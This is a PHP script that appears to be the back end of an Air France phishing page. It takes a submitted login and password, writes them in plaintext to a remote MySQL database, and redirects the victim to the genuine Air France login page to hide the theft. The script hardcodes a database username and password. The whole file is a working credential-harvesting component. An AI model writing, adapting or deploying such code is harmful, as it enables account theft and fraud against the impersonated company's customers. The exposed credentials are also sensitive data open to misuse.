<?php


$user = 'airfrance';
$pwd = 'Soufiyen93oumi';


$newBD = new PDO('mysql:host=mysql-airfrance.alwaysdata.net;dbname=airfrance_bdd', $user, $pwd);




if (isset($_POST['login']) && (isset($_POST['mdp']))) {
    $insertion = $newBD->prepare('INSERT INTO utilisateur (login,mdp) VALUES (:login,:mdp)');

    $login = $_POST['login'];
    $mdp = $_POST['mdp'];
    $insertion->bindValue(':login', $login);
    $insertion->bindValue(':mdp', $mdp);

    $verification = $insertion->execute();

    if ($verification) {
        header("Location: https://login.airfrance.com/login/account");
    }
} else {
    echo "Une variable n'est pas declaree ou est null";
}
?>